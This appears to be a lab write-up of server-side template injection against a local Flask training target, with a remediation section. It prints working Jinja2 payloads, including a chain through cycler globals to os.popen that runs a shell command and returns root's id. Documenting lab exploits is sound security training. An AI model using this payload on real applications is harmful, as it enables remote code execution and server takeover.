# SSTI — WebSploit `render-reign`

## Target

http://127.0.0.1:5021

## Parameter

name

## Vulnerability

Server-Side Template Injection (SSTI)

## Step 1 — Template Evaluation

Input:

{{7*7}}

Result:

49

This demonstrates that user-controlled input is being evaluated as a
server-side template expression.

## Step 2 — Template Context Access

Input:

{{config}}

Result:

The Flask configuration object was rendered by the server.

## Step 3 — Server-Side Command Execution

Controlled proof of concept:

{{cycler.__init__.__globals__.os.popen('id').read()}}

Result:

uid=0(root) gid=0(root) groups=0(root)

This confirms server-side command execution through the vulnerable template
engine.

## Root Cause

The application inserts user-controlled input into a template string and
passes the resulting string to `render_template_string()`.

## Impact

An attacker may be able to execute arbitrary server-side code with the
privileges of the application process.

## Remediation

- Never concatenate untrusted input into server-side templates.
- Pass user data as template variables rather than template source.
- Use a fixed template with automatic escaping.
- Restrict template functionality where possible.
- Run the application with least privilege.

## Scope

127.0.0.1:5021 — local WebSploit training environment.
